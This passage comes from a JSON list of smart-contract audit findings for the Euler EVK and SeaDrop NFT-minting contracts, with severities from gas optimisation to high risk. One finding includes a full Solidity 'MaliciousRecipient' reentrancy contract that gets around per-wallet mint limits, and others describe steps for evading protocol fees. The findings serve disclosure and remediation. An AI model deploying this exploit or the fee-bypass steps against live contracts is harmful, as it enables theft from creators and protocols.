type(uint256).max or in a bad setup). However, if someone wants to fill between real vaults or proxys values with dummy data, they are able to do so, and external reads would need to filter this data.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Unclear naming can lead to misinterpretation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Naming is key for understanding different parts of the code with just one look, indeed, wrong naming can lead to wrong assumptions of what the code is going to behave. Different instances can be improved for a better understanding:  hasControllerEnabled doesn't check if this contract is the account's controller, but if there are any controller enabled. It is used correctly but could be renamed to hasAnyControllerEnabled to avoid misinterpretation.  The term collateralValue is used ambiguously in Liquidation.sol to represent both the unadjusted and adjusted values of collateral. collateralValue should only be called like that when it represents the value, in units of account, of the full collateral. Consider renaming collateralValue to collateralAdjustedValue (or similar) when the collateral value (in units of account) is adjusted by the LTV.  amount refers to multiple things over the codebase. Sometimes it refers to shares, sometimes to assets (depending on the context) what leads to a much more less consistent and harder to read codebase (as every instance may be a different thing).", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "\"Magic numbers\" should be defined as constants to improve readability and maintainability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Numbers not defined as constants are less maintainable and readable. Changing them with mean- ingfully named constants and with proper @dev comments, would ease the read, search and maintainability.  LiquidityUtils.sol#L119: 1e4 should be CONFIG_SCALE.  IRMSynth.sol#L67: 1e18 should be TARGET_QUOTE. Should have a named constant:  Cache.sol#L96: 1e4 << INTERNAL_DEBT_PRECISION_SHIFT when feeAssets are calculated. 51  Cache.sol#L80: 1e27 as input when RPow.rpow is executed.  Cache.sol#L86: 1e27 when newInterestAccumulator is calculated.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Unused libraries", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Several libraries were left behind after some updates and are not used anymore. Unused code increases the overall complexity of the codebase, making it harder to maintain and read.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Event emission can track previous admin role for better monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "SetAdmin event logs the new admin for PoolConfig. To improve tracking and monitoring, consider also logging the current admin who initiated the change. function setAdmin(address newAdmin) external onlyAdmin { if (newAdmin == address(0)) revert E_InvalidAdmin(); admin = newAdmin; emit SetAdmin(newAdmin); } The same can be applied to SetUpgradeAdmin event to log the new upgrade admin.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "isValidInterestFee validation can be skipped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The documentation should be expanded by explaining that isValidInterestFee validation will be skipped by Governance if the interestFee is updated via Governance.setInterestFee, and will be between the bounds (GUARANTEED_INTEREST_FEE_MIN, GUARANTEED_INTEREST_FEE_MAX). If that's the case, the boundaries imposed by the ProtocolConfig are skipped.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "VaultCreated event can be enhanced for better monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The makeNewVaultInternal function performs an event emission that doesn't fully capture all of the relevant inputs. Consider including all inputs (upgradeable, asset, oracle, unitOfAccount) and the value set for CFG_EVC_COMPATIBLE_ASSET. function makeNewVaultInternal(bool upgradeable, address asset, address oracle, address unitOfAccount) ,! { returns (IEVault) // ... emit VaultCreated(newVault, asset, upgradeable); }", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Event emission in createVault can be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The function makeNewVaultInternal emits an event, which provides valuable tracking information. A similar event could be emitted at createVault to track the creation of the vault with its specified parameters.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Missing safety checks can lead to undesired behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "In different contract constructors and some setters, different addresses are set to a variable without checking whether these addresses are non-zero, or if they represent deployed contracts. This contrasts with the approach in other contracts where such safety checks are implemented. Ignoring these checks could lead to some undesired behavior:  Core.sol constructor sanity checks:  governor_ !== address(0)  feeReceiver_ !== address(0)  BaseProductLine.sol constructor sanity checks:  vaultFactory_ !== address(0)  evc_ !== address(0)  BaseProductLine.sol makeNewVaultInternal fast revert check:  asset !== address(0) makeNewVaultInternal can include a check to fast revert rather than waiting for isEVCCompatible to revert.  Core.sol createVault safety checks:  oracle!== address(0)  unitOfAccount!== address(0)", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Missing/wrong comments and typos", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Comments help to provide context and documentation on what different functions, contracts and variables do. Providing clear and precise comments is key to a clean and maintainable codebase. See below a list of related nitpicks:  Missing comments:  GenericFactory.sol#L133 and BaseProductLine.sol#L86 should be documented and explain that the special case where end == type(uint256).max exists.  BorrowUtils.sol#L66 an inline comment would be useful to explain the logic.  AddressUtils.sol#L8 should provide comments regarding the cases in which checkContract won't work as expected by the function name due to the check of code.length on contracts that, for example, are not yet deployed.  Unclear comments:  AssetTransfers.sol#L25-28 the comment could list and explain with more detail all the possible revert scenarios.  Governance.sol#L213 add some extra comments regarding how origLTV.getLTV(true) returns the \"current\" LTV (based on ramping config) and not the target LTV under the ramping mode scenario.  Wrong comments: 54  Cache.sol#L39-L40 MarkeStorage (a misspelled ancestor name) is used instead of VaultStorage.  Dispatch.sol#L66 the comment states that no code will run before delegating to module. How- ever, it does not take into account the callThroughEVC modifier that was used previously to use modifier in functions like mint, withdraw, redeem, skim, borrow, repay, loop, etc...  IEVault.sol#L365 includes a stale comment, items in a list can't be duplicated right now.  LTVConfig.sol#L44 timeRemaining < rampDuration should be timeRemaining <= rampDuration.  Typos:  ProtocolConfig.sol#L9 bech should be be.  Constants.sol#L10 enusure should be ensure.  Events.sol#L26 initiaiting should be initiating.  Events.sol#L29 recipt should be receipt.  Events.sol#L36 receiver should be the receiver.  Events.sol#L82-L83 transfered should be transferred.  BalanceForwarder.sol#L12 a with should be with a.  ERCCollateral.sol#L21, Dispatch.sol#L136, RiskManager.sol#L64, RiskManager.sol#L84, VaultStorage.sol#L24 re-entrancy should be reentrancy.  Natspec @return missing:  The IERC20 Interface is missing the NatSpec @return.  Natspec missing:  GenericFactory.sol  PegStabilityModule.sol", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Liquidation Invariants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Euler uses different LTV configurations as well as different prices for liquidation and borrowing Borrows are accepted when healthScore(borrow) > 1.0, and liquidations are performed calculations. when healthScore(x) := collateralValue(x) * getLTV(x) / liabilityValue(x). It's important that an accepted health check when borrowing does not immediately lead to an unhealthy position regarding liquidation checks. We can prove this by showing healthScore(liquidation) >= healthScore(borrow).  getLTV invariant: The following holds for getLTV: getLTV(borrowing) <= getLTV(liquidation) Proof: From the code we can distinguish the cases: 1. targetLTV >= originalLTV: getLTV(borrowing) = getLTV(liquidation) = targetLTV. 2. targetLTV < originalLTV: getLTV(borrowing) = targetLTV <= lerp(originalLTV, targetLTV) = getLTV(liquidation). 55  Health invariant: The following holds for healthScore(x): healthScore(borrow) <= healthScore(liquidation) Proof: collateralValue(borrow) * getLTV(borrow) / liabilityValue(borrow) <= collateralValue(liquidation) * getLTV(liquidation) / liabilityValue(liquidation) This follows from: 1. collateralValue(borrow) <= collateralValue(liquidation) as borrow uses bid prices compared to liq- uidations using the mid price. 2. liabilityValue(borrow) >= liabilityValue(liquidation) as borrow uses ask prices compared to liq- uidations using the mid price. 3. getLTV(borrowing) <= getLTV(liquidation) by the getLTV invariant. The oracles need to guarantee that liquidations", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "ERC721SeaDrop's modifier onlyOwnerOrAdministrator would allow either the owner or the admin to override the other person's config parameters.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The following 4 external functions in ERC721SeaDrop have the onlyOwnerOrAdministrator modifier which allows either one to override the other person's work.  updateAllowedSeaDrop  updateAllowList  updateDropURI  updateSigner That means there should be some sort of off-chain trust established between these 2 entities. Otherwise, there are possible vectors of attack. Here is an example of how the owner can override AllowListData.merkleRoot and the other fields within AllowListData to generate proofs for any allowed SeaDrop's mintAllowList endpoint that would have MintParams.feeBps equal to 0: 1. The admin calls updateAllowList to set the Merkle root for this contract and emit ERC721SeaDrop.updateAllowList: SeaDrop.sol#L827 the other parameters as logs. for an allowed SeaDrop implementation The SeaDrop endpoint being called by 2. The owner calls updateAllowList but this time with new parameters, specifically a new Merkle root that is computed from leaves that have MintParams.feeBps == 0. 3. Users/minters use the generated proof corresponding to the latest allow list update and pass their mintParams.feeBps as 0. And thus avoiding the protocol fee deduction for the creatorPaymentAddress (SeaDrop.sol#L187-L194).", "labels": ["Spearbit", "Seadrop", "Severity: High Risk"]}, {"title": "Reentrancy of fee payment can be used to circumvent max mints per wallet check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "In case of a mintPublic call, the function _checkMintQuantity checks whether the minter has exceeded the parameter maxMintsPerWallet, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check. The following is an example contract that can be employed by the feeRecipent (assume that maxMintsPerWallet is 1): 7 contract MaliciousRecipient { bool public startAttack; address public token; SeaDrop public seaDrop; fallback() external payable { if (startAttack) { startAttack = false; seaDrop.mintPublic{value: 1 ether}({ nftContract: token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); } } // Call `attack` with at least 2 ether. function attack(SeaDrop _seaDrop, address _token) external payable { token = _token; seaDrop = _seaDrop; startAttack = true; _seaDrop.mintPublic{value: 1 ether}({ nftContract: _token, feeRecipient: address(this), minterIfNotPayer: address(this), quantity: 1 }); token = address(0); seaDrop = SeaDrop(address(0)); } } This is especially bad when the parameter PublicDrop.restrictFeeRecipients is set to false, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users, i.e., should be part of _allowedFeeRecipients[nftContract] mapping, would be able to circumvent the check--lower severity due to needed privileged access. Also, creatorPaymentAddress can use re-entrancy to get around the same check. See SeaDrop.sol#L571.", "labels": ["Spearbit", "Seadrop", "Severity: High Risk"]}, {"title": "Cross SeaDrop reentrancy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The contract that implements IERC721SeaDrop can work with multiple Seadrop implementations, for example, a Seadrop that accepts ETH as payment as well as another Seadrop contract that accepts USDC as payment at the same time. This introduces the risk of cross contract re-entrancy that can be used to circumvent the maxMintsPerWallet check. Here's an example of the attack: 1. Consider an ERC721 token that that has two allowed SeaDrop, one that accepts ETH as payment and the other that accepts USDC as payment, both with public mints and restrictedFeeRecipients set to false. 2. Let maxMintPerWallet be 1 for both these cases. 3. A malicious fee receiver can now do the following:  Call mintPublic for the Seadrop with ETH fees, which does the _checkMintQuantity check and trans- fers the fees in ETH to the receiver.  The receiver now calls mintPublic for Seadrop with USDC fees, which does the _checkMintQuantity check that still passes.  The mint succeeds in the Seadrop-USDC case.  The mint succeeds in the Seadrop-ETH case.  The minter has 2 NFTs even though it's capped at 1. Even if a re-entrancy lock is added in the SeaDrop, the same issue persists as it only enters each Seadrop contract once.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "Lack of replay protection for mintAllowList and mintSigned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "merkle proofs) there are no checks that prevent re-using the same signature or Merkle proof multiple This is indirectly enforced by the _checkMintQuantity function that checks the mint statistics times. using exceeds maxMintsPerWallet. Replays can happen if a wallet does not claim all of maxMintsPerWallet in one transaction. For example, assume that maxMintsPerWallet is set to 2. A user can call mintSigned with a valid signature and quantity = 1 twice. IERC721SeaDrop(nftContract).getMintStats(minter) reverting quantity and the if Typically, contracts try to avoid any forms of signature replays, i.e., a signature can only be used once. This simpli- fies the security properties. In the current implementation of the ERC721Seadrop contract, we couldn't see a way to exploit replay protection to mint beyond what could be minted in a single initial transaction with the maximum value of quantity supplied. However, this relies on the contract correctly implementing IERC721SeaDrop.getMintStats.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "The digest in SeaDrop.mintSigned is not calculated correctly according to EIP-712", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "mintParams in the calculation of the digest in mintSigned is of struct type, so we would need to calculate and use its hashStruct , not the actual variable on its own.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "ERC721A has mint caps that are not checked by ERC721SeaDrop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "ERC721SeaDrop inherits from ERC721A which packs balance, numberMinted, numberBurned, and an extra data chunk in 1 storage slot (64 bits per substorage) for every address. This would add an inherent cap of 264 (cid:0) 1 to all these different fields. Currently, there is no check in ERC721A's _mint for quantity nor in ERC721SeaDrop's mintSeaDrop function. Also, if we almost reach the max cap for a balance by an owner and someone else transfers a token to this owner, there would be an overflow for the balance and possibly the number of mints in the _packedAddressData. The overflow could possibly reduce the balance and the numberMinted to a way lower numer and numberBurned to a way higher number", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "ERC721SeaDrop owner can choose an address they control as the admin when the constructor is called.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The owner/creator can call the contract directly (skip using the UI) and set the administrator as themselves or another address that they can control. Then after they create a PublicDrop or TokenGatedDrop, they can call either updatePublicDropFee or updateTokenGatedDropFee and set the feeBps to  zero  or another number and also call the updateAllowedFeeRecipient to add the same or another address they control as a feeRecipient. This way they can circumvent the protocol fee.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "ERC721SeaDrop's admin would need to set feeBps manually after/before creation of each drop by the owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "When an owner of a ERC721SeaDrop token creates either a public or a token gated drop by calling updatePublicDrop or updateTokenGatedDrop, the PublicDrop.feeBps/TokenGatedDropStage.feeBps is initially set to 0. So the admin would need to set the feeBps parameter at some point (before or after). Forgetting to set this parameter results in not receiving the protocol fees.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "owner can reset feeBps set by admin for token gated drops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Only the admin can call updateTokenGatedDropFee to update feeBps. However, the owner can call updateTokenGatedDrop(address seaDropImpl, address allowedNftToken, TokenGatedDropStage calldata drop- Stage) twice after that to reset the feeBps to 0 for a drop. 1. Once with dropStage.maxTotalMintableByWallet equal to 0 to wipe out the storage on the SeaDrop side. 2. Then with the same allowedNftToken address and the other desired parameters, which would retrieve the previously wiped out drop stage data (with feeBps equal to 0). NOTE: This type of attack does not apply to updatePublicDrop and updatePublicDropFee pair. Since updatePub- licDrop cannot remove or update the feeBps. Once updatePublicDropFee is called with a specific feeBps that value remains for this ERC721SeaDrop contract-related storage on SeaDrop (_publicDrops[msg.sender] = pub- licDrop). And any number of consecutive calls to updatePublicDrop with any parameters cannot change the already set feeBps.", "labels": ["Spearbit", "Seadrop", "Severity: Medium Risk"]}, {"title": "Update the start token id for ERC721SeaDrop to 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "ERC721SeaDrop's mintSeaDrop uses _mint from ERC721A library which starts the token ids for minting from 0. /// contracts/ERC721A.sol#L154-L156 /** * @dev Returns the starting token ID. * To change the starting token ID, please override this function. */ function _startTokenId() internal view virtual returns (uint256) { return 0; }", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Update the ERC721A library due to an unpadded toString() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The audit repo uses ERC721A at dca00fffdc8978ef517fa2bb6a5a776b544c002a which does not add a trailing zero padding to the returned string. Some projects have had issues reusing the toString() where the off-chain call returned some dirty-bits at the end (similar to Seaport 1.0's name()).", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Warn contracts implementing IERC721SeaDrop to revert on quantity == 0 case", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "There are no checks in Seadrop that prevents minting for the case when quantity == 0. This would call the function mintSeadrop(minter, quantity) for a contract implementing IERC721SeaDrop with quantity == 0. It is up to the implementing contract to revert in such cases. The ERC721A library reverts when quantity == 0--the correct behaviour. However, there has been instances in the past where ignoring quantity == 0 checks have led to security issues.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Missing parameter in _SIGNED_MINT_TYPEHASH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "A parameter is missing (uint256 maxTokenSupplyForStage) and got caught after reformatting.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Missing address(0) check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "All update functions having an address as an argument check them against address(0). This is missing in updateTokenGatedDrop. This is also not protected in ERC721SeaDrop.sol#updateTokenGatedDrop(), so address(0) could pass as a valid value.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk SeaDrop.sol#L856, SeaDrop.sol#L907-L909, SeaDrop.sol#L927-L929, SeaDrop.sol#L966-L968,"]}, {"title": "Missing boundary checks on feeBps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "There's a missing check when setting feeBps from ERC721SeaDrop.sol while one exists when the value is used at a later stage in Seadrop.sol, which could cause a InvalidFeeBps error.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Upgrade openzeppelin/contracts's version", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "There are known vulnerabilities in the current @openzeppelin/contracts version used. This affects SeaDrop.sol with a potential Improper Verification of Cryptographic Signature vulnerability as ECDSA.recover is used.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "struct TokenGatedDropStage is expected to fit into 1 storage slot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "struct TokenGatedDropStage is expected to be tightly packed into 1 storage slot, as per announced in its @notice tag. However, the struct actually takes 2 slots. This is unexpected, as only one slot is loaded in the dropStageExists assembly check.", "labels": ["Spearbit", "Seadrop", "Severity: Low Risk"]}, {"title": "Avoid expensive iterations on removal of list elements by providing the index of element to be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Iterating through an array (address[] storage enumeration) to find the desired element (address toRemove) can be an expensive operation. Instead, it would be best to also provide the index to be removed along with the other parameters to avoid looping over all elements. Also note in the case of _removeFromEnumeration(signer, enumeratedStorage), hopefully, there wouldn't be too many signers corresponding to a contract. So practically, this wouldn't be an issue. But something to note. Although the owner or admin can stuff the signer list with a lot of signers as the other person would not be able to remove from the list (DoS attack). For example, if the owner has stuffed the signer list with malicious signers, the admin would not be able to remove them.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "mintParams.allowedNftToken should be cached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "mintParams.allowedNftToken is accessed several times in the mintAllowedTokenHolder function. It would be cheaper to cache it: // Put the allowedNftToken on the stack for more efficient access. address allowedNftToken = mintParams.allowedNftToken;", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "Immutables which are calculated using keccak256 of a string literal can be made constant.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Since Solidity 0.6.12, keccak256 expressions are evaluated at compile-time: Code Generator: Evaluate keccak256 of string literals at compile-time. The suggestion of marking these expressions as immutable to save gas isn't true for compiler versions >= 0.6.12. As a reminder, before that, the occurrences of constant keccak256 expressions were replaced by the expressions instead of the computed values, which added a computation cost.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Combine a pair of mapping to a list and mapping to a mapping into mapping to a linked-list", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "SeaDrop uses 3 pairs of mapping to a list and mapping to a mapping that can be combined into just one mapping. The pairs: 1. _allowedFeeRecipients and _enumeratedFeeRecipients 2. _signers and _enumeratedSigners 3. _tokenGatedDrops and _enumeratedTokenGatedTokens Here we have variables that come in pairs. One variable is used for data retrievals (a flag or a custom struct) and the other for iteration/enumeration. mapping(address => mapping(address => CustomStructOrBool)) private variable; mapping(address => address[]) private _enumeratedVariable;", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "The onlyAllowedSeaDrop modifier is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The onlyAllowedSeaDrop modifier is always used next to another one (onlyOwner, onlyAdminis- trator or onlyOwnerOrAdministrator). As the owner, which is the least privileged role, already has the privilege to update the allowed SeaDrop registry list for this contract (by calling updateAllowedSeaDrop), this makes this second modifier redundant.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop in ERC721SeaDrop to save storage and gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Combine _allowedSeaDrop and _enumeratedAllowedSeaDrop into just one variable using a cyclic linked-list data structure. This would reduce storage space and save gas when storing or retrieving parameters.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "<array>.length should not be looked up in every loop of a for-loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Reading an array's length at each iteration of a loop consumes more gas than necessary.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "A storage pointer should be cached instead of computed multiple times", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Caching a mapping's value in a local storage variable when the value is accessed multiple times saves gas due to not having to perform the same offset calculation every time.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "Comparing a boolean to a constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value.", "labels": ["Spearbit", "Seadrop", "Severity: Gas Optimization"]}, {"title": "mintAllowList, mintSigned, or mintAllowedTokenHolder have an inherent cap for minting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "mintAllowedTokenHolder is stored in a uint40 (after this audit uint32) which limits the maximum token id that can be minted using mintAllowList, mintSigned, or mintAllowedTokenHolder.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Consider replacing minterIfNotPayer parameter to always correspond to the minter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Currently, the variable minterIfNotPayer is treated in the following way: if the value is 0, then msg.sender would be considered as the minter. Otherwise, minterIfNotPayer would be considered as the minter. The logic can be simplified to always treat this variable as the minter. The 0 can be replaced by setting msg.sender as minterIfNotPayer. The variable should then be renamed as well--we recommend calling it minter afterwards.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "The interface IERC721ContractMetadata does not extend IERC721 interface", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The current interface IERC721ContractMetadata does not include the ERC-721 functions. As a comparision, OpenZeppelin's IERC721Metadata.sol extends the IERC721 interface.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Add unit tests for mintSigned and mintAllowList in SeaDrop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The only test for the mintSigned and the mintAllowList functions are fuzz tests.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Rename a variable with a misleading name", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "enumeratedDropsLength variable name in SeaDrop._removeFromEnumeration is a bit misleading since _removeFromEnumeration is used also for signer lists, feeRecipient lists, etc..", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "The protocol rounds the fees in the favour of creatorPaymentAddress", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The feeAmount calculation rounds down, i.e., rounds in the favour of creatorPaymentAddress and against feeRecipient. For a minuscule amount of ETH (price such that price * feeBps < 10000), the fees received by the feeRecipient would be 0. An interesting case here would be if the value quantity * price * feeBps is greater than or equal to 10000 and price * feeBps < 10000. In this case, the user can split the mint transaction into multiple transactions to skip the fees. However, this is unlikely to be profitable, considering the gas overhead involved as well as the minuscule amount of savings.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Consider using type(uint).max as the magic value for maxTokenSupplyForStage instead of 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The value 0 is currently used as magic value to mean that maxTokenSupplyForStage to mean that the check quantity + currentTotalSupply > maxTokenSupplyForStage. However, the value type(uint).max is a more appropriate magic value in this case. This also avoids the need for additional branching if (maxTo- kenSupplyForStage != MAGIC_VALUE) as the condition quantity + currentTotalSupply > type(uint).max is never true.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Missing edge case tests on uninitialized AllowList", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The default value for _allowListMerkleRoots[nftContract] is 0. A transaction that tries to mint an NFT in this case with an empty proof (or any other proof) should revert. There were no tests for this case.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Consider naming state variables as public to replace the user-defined getters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Several state variables, for example, mapping(address => PublicDrop) private _publicDrops; but have corresponding getters defined (function getPublicDrop(address have private visibility, nftContract)). Replacing private by public and renaming the variable name can decrease the code. There are several examples of the above pattern in the codebase, however we are only listing one here for brevity.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Use bytes.concat instead of abi.encodePacked for concatenation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "While one of the uses of abi.encodePacked is to perform concatenation, the Solidity language does contain a reserved function for this: bytes.concat.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Misleading comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The comment says // Check that the sender is the owner of the allowedNftTokenId.. However, minter isn't necessarily the sender due to how it's set: address minter = minterIfNotPayer != address(0) ? minterIfNotPayer : msg.sender;.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Use i instead of j as an index name for a non-nested for-loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Using an index named j instead of i is confusing, as this naming convention makes developers expect that the for-loop is nested, but this is not the case. Using i is more standard and less surprising.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Avoid duplicating code for consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The _checkActive function is used in every mint function besides mintPublic where the code is almost the same.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "restrictFeeRecipients is always true for either PublicDrop or TokenGatedDrop in ERC721SeaDrop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "restrictFeeRecipients is always true for either PublicDrops or TokenGatedDrops. When either one of these drops gets created/updated by calling one of the four functions below on a ERC721SeaDrop contract, its value is hardcoded as true:  updatePublicDrop  updatePublicDropFee  updateTokenGatedDrop  updateTokenGatedDropFee", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Reformat lines for better readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "These lines are too long to be readable. A mistake isn't easy to spot.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Comment is a copy-paste", "html_url": 